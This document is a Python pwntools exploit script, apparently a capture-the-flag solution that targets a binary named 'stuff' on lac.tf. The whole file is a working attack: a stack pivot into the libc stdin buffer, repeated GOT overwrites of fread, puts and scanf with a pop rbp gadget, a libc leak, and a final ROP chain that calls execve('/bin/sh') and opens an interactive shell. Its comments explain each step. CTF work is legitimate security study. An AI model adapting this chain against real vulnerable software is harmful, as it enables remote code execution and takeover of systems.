#!/usr/bin/env python3

# Overview:
# Stack pivot to the libc stdin buffer
# Use the fread call at the end of main to overwrite fread GOT with a pop rbp gadget
# This makes the call to fread act like a ret instruction and gives us control over rdi
# Leak libc with puts
# Use fread to overwrite puts GOT with pop rbp
# This can't be done in the first fread call since we have to pivot
# Use fread to overwrite scanf GOT with pop rbp
# Now we can control both rdi and rsi with various fragments of main
# Call fread with a bigger size to get rid of junk in the libc input buffer and read the final ropchain
# Pivot to the final ropchain and execve /bin/sh

from pwn import *

exe = ELF("./stuff")
libc = ELF("./libc.so.6")

context.binary = exe

# r = process([exe.path])
# r = gdb.debug([exe.path])
r = remote("lac.tf", 31182)

# Get heap leak
r.sendlineafter(b"stuff\n", b"1")
r.recvuntil(b"leak: ")
leak = int(r.recvline(keepends=False), 0)
log.info(f"{hex(leak)=}")
# Address of libc stdin buffer
buffer_addr = leak - 0x1010
log.info(f"{hex(buffer_addr)=}")

# Instructions before the call to fread at the end of main, used to overwrite GOT and control rdi
fread_gadget = 0x40120F
# Instructions before the call to scanf, used to control rsi after scanf GOT is overwritten
rsi_gadget = 0x4011B0
# Instructions at the end of the loop before the jump back to puts, used to control eax after puts GOT is overwritten
eax_gadget = 0x401207
# Instruction before the call to fread that moves rax to rdi
rax_to_rdi_gadget = 0x401227
# Number of bytes from the start of the libc input buffer to the second half of the payload
# The gap in the middle is stack space for the functions
rop3_offset = 2048

# Overwrite GOT using the fread call at the end of main and pivot to rop3
rop1 = ROP(exe)
rop1.raw(exe.got.setbuf + 16)  # Set rbp with the leave instruction
rop1.raw(fread_gadget)
log.info(rop1.dump())

# This is the data that will be written to GOT starting with the entry for setbuf
rop2 = ROP(exe)
rop2.raw(b"AAAAAAAA")  # setbuf GOT
rop2.raw(rop2.find_gadget(["pop rbp", "ret"]))  # fread GOT
# Pivot to rop3 using the leave; ret at the end of main
rop2.raw(buffer_addr + rop3_offset)  # rbp
rop2.raw(rop2.find_gadget(["leave", "ret"]))
log.info(rop2.dump())

# fread GOT has been overwritten with a pop rbp gadget, which will pop the return address pushed by the call and return
# So the call to fread now acts like a ret instruction and the instructions before it can be used to control rdi

rop3 = ROP(exe)

# Leak libc by calling puts
rop3.raw(exe.got.puts + 16)  # rbp
# Set rdi with the instructions before the fread call
rop3.raw(fread_gadget)
# Since the puts GOT has been overwritten, we call it by jumping to the second instruction in the puts PLT
rop3.raw(exe.plt.puts + 6)

# Overwrite GOT again with fread
# Since we overwrote fread GOT earlier, we don't have to stack pivot again
# So we can also overwrite puts GOT with a pop rbp gadget
# The data that will be written is in rop4 below
rop3(rbp=exe.got.setbuf + 16)
rop3.raw(fread_gadget)
rop3.raw(exe.plt.fread + 6)

# Overwrite GOT one last time to overwrite the scanf entry with a pop rbp gadget
# The data that will be written is in rop5
rop3(rbp=exe.got.__isoc99_scanf + 16)
rop3.raw(fread_gadget)
rop3.raw(exe.plt.fread + 6)

# fread, puts, and scanf are now all overwritten with pop rbp
# We now have control over both rdi and rsi

# Call fread with the item size set to 67 to get rid of the junk in the libc stdin buffer and read the final ropchain
# Set rdx and rcx
rop3.raw(fread_gadget)
# Set rsi with the instructions before the scanf call
rop3(rbp=66 + 4)
rop3.raw(rsi_gadget)
# Set rdi to some heap address that we don't care about
# We first set eax and then move the value to rdi to avoid clobbering rsi
# Set eax with the instructions at the end of the loop
# This is 4 + the address of the p32(leak) value at the end of the first half of the payload
rop3(rbp=buffer_addr + 129 + 4)
rop3.raw(eax_gadget)
# Move the value from eax to rdi
rop3.raw(rax_to_rdi_gadget)
# Call fread
rop3.raw(exe.plt.fread + 6)
# Pivot to the final ropchain
rop3(rbp=buffer_addr)
rop3.raw(rop3.find_gadget(["leave", "ret"]))
log.info(rop3.dump())

# Data that will be written in the second GOT overwrite
rop4 = ROP(exe)
rop4.raw(b"BBBBBBBB")
rop4.raw(rop4.find_gadget(["pop rbp", "ret"]))  # fread GOT
rop4.raw(rop4.find_gadget(["pop rbp", "ret"]))  # puts GOT
rop4.raw(b"CCCCCCCC")
log.info(rop4.dump())

# Data that will be written in the third GOT overwrite
rop5 = ROP(exe)
rop5.raw(rop5.find_gadget(["pop rbp", "ret"]))  # scanf GOT
rop5.raw(b"DDDDDDDD")
rop5.raw(b"EEEEEEEE")
rop5.raw(rop5.find_gadget(["pop rbp", "ret"]))  # fread GOT
log.info(rop5.dump())

payload = b"2"
payload += rop1.generatePadding(0, 16)
payload += rop1.chain()
# Data that will be written to GOT
payload += rop2.chain()
payload += rop4.chain()
payload += rop5.chain()
payload += p32(leak)  # Value that will be loaded into eax in order to set rdi without clobbering rsi
payload = payload.ljust(rop3_offset, b"\0")  # Stack space for the functions that we call
payload += rop3.chain()

r.sendafter(b"stuff\n", payload)

# Get libc leak
libc.address = int.from_bytes(r.recvline(keepends=False), "little") - libc.symbols.puts
log.info(f"{hex(libc.address)=}")

# Final ropchain utilizing libc
rop6 = ROP([exe, libc])
rop6.raw(b"bbbbbbbb")  # rbp
# Direct execve syscall
rop6(rax=constants.SYS_execve, rdi=next(libc.search(b"/bin/sh\0")), rsi=0, rdx=0)
rop6.raw(rop6.find_gadget(["syscall"]))
log.info(rop6.dump())
r.send(rop6.chain())

r.interactive()
